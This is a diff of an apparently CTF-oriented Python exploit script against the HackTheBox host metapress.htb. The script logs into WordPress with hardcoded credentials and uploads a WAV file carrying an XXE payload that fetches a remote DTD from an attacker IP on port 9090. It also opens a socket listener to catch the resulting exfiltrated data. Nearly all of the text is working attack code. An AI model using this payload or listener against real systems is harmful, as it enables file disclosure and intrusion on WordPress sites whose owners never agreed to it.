@@ -36,81 +36,37 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 #### ========= FUNCTION =========
 
-## Banner
-def banner():
-  EwLogo = f"""
-
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⣀⠠⠤⢤⣤⣶⣴⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⢿⣷⣄⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠈⠉⠛⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡯⣿⣷⡄⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠰⢾⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢌⡻⢿⡆⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠝⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡌⠿⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣸⣧⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠁
-⠀⠀⠀⠀⠀⠀⠀⢀⣾⣏⣴⠟⢻⣿⠟⠛⠶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢻⣿⡀
-⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣴⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢳⣜⣿⡇
-⠀⠀⠀⠀⠀⣠⣾⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢿⣿⡇
-⠀⠀⢀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠸⣿⠇
-⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢸⣿⡄⡿⠀
-⢺⣿⡏⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠋⠙⠻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡝⣦⠀⣸⣿⡧⠃⠀
-⠀⠈⠉⠀⢠⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀⡀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⣿⣷⣿⣿⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⢀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⣼⡇⣾⣿⣿⠇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢻⣿⣀⣾⣿⢡⣿⡿⠋⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⢣⣿⣿⣿⣿⣣⡿⠋⠁⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⠿⣋⣴⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡇⠀⢀⣠⣶⣿⣿⡿⠟⠋⠉⠐⠊⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⣴⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀{RED}#--------------------------------------------#
- _____  _                         ___  _  _    _  _____  _   __ 
-|  ___|| |                       /   || || |  | ||  _  || | / _|
-| |__  | |_   ___  _ __  _ __   / /| || || |  | || |/' || || |_ 
-|  __| | __| / _ \| '__|| '_ \ / /_| || || |/\| ||  /| || ||  _|
-| |___ | |_ |  __/| |   | | | |\___  || |\  /\  /\ |_/ /| || |  
-\____/  \__| \___||_|   |_| |_|    |_/|_| \/  \/  \___/ |_||_|  
-                                                                
-#----------------------------------------------------------------# 
-    
-    Author: {GREEN}0xEtern4lW0lf{END}                           
-    {RED}Site: {BLUE}https://0xetern4lw0lf.github.io/{END}
-
-    FOR EDUCATIONAL PURPOSE ONLY.
-
-  """
-  return print(f'{BLUE}{EwLogo}{END}')
-
-# Pretty loading wheel
-def loading(spins):
-
-    def spinning_cursor():
-        while True:
-            for cursor in '|/ -\\':
-                yield cursor
-
-    spinner = spinning_cursor()
-    for _ in range(spins):
-        sys.stdout.write(next(spinner))
-        sys.stdout.flush()
-        time.sleep(0.1)
-        sys.stdout.write('\b')
-
 
 ## Weaponization and Attack
 
 def listenPythonServer():
-    HOST = '0.0.0.0'     # Endereco IP do Servidor
-    PORT = 9090            # Porta que o Servidor esta
-    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    orig = (HOST, PORT)
-    tcp.bind(orig)
-    tcp.listen(1)
-    while True:
-        con, cliente = tcp.accept()
-        print('Conectado por', cliente)
-        while True:
-            msg = con.recv(1024)
-            if not msg: break
-            print(cliente, msg)
-        print('Finalizando conexao do cliente', cliente)
-        con.close()
+    print(f"\n{BLUE}[+] LISTEN: {YELLOW}Starting handler on {GREEN}9090 {BLUE}[+]{END}")
+    tn = telnetlib.Telnet()
+    print('\n01')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print('\n02')
+    s.bind(("0.0.0.0",9090))
+    print('\n03')
+    s.listen(1)
+    print('\n04')
+    conn, addr = s.accept()
+
+    print('\n05')
+    print(f"{BLUE}[+] LISTEN: {YELLOW}Receiving connection from {GREEN}{addr} {BLUE}[+]{END}")
+#   tn.sock = conn
+    print(f"\n{BLUE}[+] SUCCESS: {GREEN}HABEMUS SHELL! {BLUE}[+]{END}\n")
+
+    print('\n06')
+    try:
+        msg = conn.recv(4048)
+        print(msg)
+    except:
+        s.close()
+    
+
+
+
+
 
 
 # Session HTTP
@@ -118,112 +74,80 @@ r = requests.session()
 
 '''Requests HTTP here'''
 
+
 def loginAdmin():
     print(f"\n{BLUE}[+] LOGIN: {YELLOW}Let's login as admin! {BLUE}[+]{END}")
     url = f"http://metapress.htb/wp-login.php"
 
     
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'Origin': 'http://metapress.htb',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Cookie': 'PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check',
-        'Content-Length': '136'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Referer': 'http://metapress.htb/wp-login.php',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'close'
+        }
+
+    cookies = {
+        'cookie': 'PHPSESSID=vn4lvbrp08q2giu9ltt6qjkmol; wordpress_test_cookie=WP%20Cookie%20check'
         }
 
 
-    data = {'log':'manager', 'pwd':'partylikearockstar', 'rememberme':'forever', 'wp-submit':'Log+In', 'redirect_to':'http://metapress.htb/wp-admin/', 'testcookie':'1'}
+    data = {'log':'manager', 'pwd':'partylikearockstar', 'rememberme':'forever', 'wp-submit':'Log+In', 'testcookie':'1'}
     
-    r.post(url, headers=headers, data=data, verify=False)
+    r.post(url, headers=headers, data=data, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
 
-    #allow_redirects=True
-
-    url = f"http://metapress.htb/wp-admin/profile.php"
-
-    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
-    'Connection': 'close', 
-    'Referer': 'http://metapress.htb/wp-login.php'
-    }
-
-#    'Cookie': 'PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check', 
-    
-
-    r.get(url, headers=headers, cookies=r.cookies, data=data, verify=False)
-
-
-    loading(8)
     print(f"{BLUE}[+] LOGIN: {YELLOW}Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")
 
+    cookies=r.cookies
+    r.get("http://metapress.htb/wp-admin/upload.php", headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)
+
+
+
 def sendPayload():
+
+    print('UPANDO PAYLOAD!')
 
     url = f"http://metapress.htb/wp-admin/async-upload.php"
 
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
         'Accept-Encoding': 'gzip, deflate',
         'Referer': 'http://metapress.htb/wp-admin/upload.php',
-        'Content-Type': 'multipart/form-data; boundary=---------------------------174185978927769959843803489761',
-        'Connection': 'close',
-        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C2b2aafa0115b38bfd11857f8c86bcb23c720aea5d1787e89ad59efd79ee52b3a; PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C5d3ab6f57e48d4d88afba560350a61030cb812abdb0562d7f8833d33f033cc2a'
-}
+        'Content-Type': 'multipart/form-data; boundary=---------------------------67263521016585108752196551629',
+        'Connection': 'close'
+        }
 
+    cookies = {
+        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Ca7a88a601ba2c14a4f2de07b403626fbe76c8a27f0d5413f26dbd88de62c0e1d; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; PHPSESSID=145b3hurico7qhbhnt8g35hkun; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673664715%7CvPVReM8AI2R4ST77M0uG6zkWVXHDZfHzOyzMYiHk169%7Cbfe916fded4513f4472966d1fe0d1d02f39afadcc199df1dc404612a8e29bf56'
+    }
 
-    data = '''-----------------------------174185978927769959843803489761
+    data = '''-----------------------------67263521016585108752196551629
 Content-Disposition: form-data; name="name"
 
 payload.wav
------------------------------174185978927769959843803489761
+-----------------------------67263521016585108752196551629
 Content-Disposition: form-data; name="action"
 
 upload-attachment
------------------------------174185978927769959843803489761
+-----------------------------67263521016585108752196551629
 Content-Disposition: form-data; name="_wpnonce"
 
-2be5fb72ae
------------------------------174185978927769959843803489761
+8100393317
+-----------------------------67263521016585108752196551629
 Content-Disposition: form-data; name="async-upload"; filename="payload.wav"
 Content-Type: audio/x-wav
 
 RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.7:9090/etern4lw0lf.dtd'>%remote;%init;%trick;]>\x00
------------------------------174185978927769959843803489761--'''
+-----------------------------67263521016585108752196551629--'''
 
 
-    r.post(url, headers=headers, data=data, verify=False, proxies=proxies)
-
-def sendPayload2():
-
-    files = {
-        "name": 'payload.wav', 
-        'action': 'upload-attachment', 
-        '_wpnonce': '2be5fb72ae', 
-        'async-upload': (
-            'payload.wav',
-            '''RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.7:9090/etern4lw0lf.dtd'"'"'>%remote;%init;%trick;]>\x00''', 
-            'audio/x-wav'       
-            )
-
-    }
-
-    url = f"http://metapress.htb/wp-admin/async-upload.php"
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
-        'Cookie': 'wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C2b2aafa0115b38bfd11857f8c86bcb23c720aea5d1787e89ad59efd79ee52b3a; PHPSESSID=00q23nafsv83lncbkf9c70il1t; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-2=1672371066; wp-settings-2=uploader%3D1%26mfold%3Df; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1673627630%7CWRFzYNT5KG25CR74watFADO8H0yHP4jucvsv30e6RXJ%7C5d3ab6f57e48d4d88afba560350a61030cb812abdb0562d7f8833d33f033cc2a',
-        'Accept-Encoding': 'gzip, deflate',
-        'Referer': 'http://metapress.htb/wp-admin/upload.php',
-        'Content-Length': '751',
-        'Connection': 'close'
-        }
-#        'Content-Type': 'multipart/form-data; boundary=---------------------------294553548838541967261519270135',
-        
-
-
-    response = r.post(url, headers=headers, files=files, verify=False, proxies=proxies, )
-    print(response.text)
-
-
-
-
-
+    r.post(url, headers=headers, data=data, verify=False, cookies=cookies, allow_redirects=False, proxies=proxies)
 
 
 def main():
@@ -240,9 +164,14 @@ def main():
     lport = args.localport
     
 
+#    thr = Thread(target=listenPythonServer)
+#    thr.start()
+
+
     loginAdmin()
 
     sendPayload()
+
 
 #### EXECUTION
 
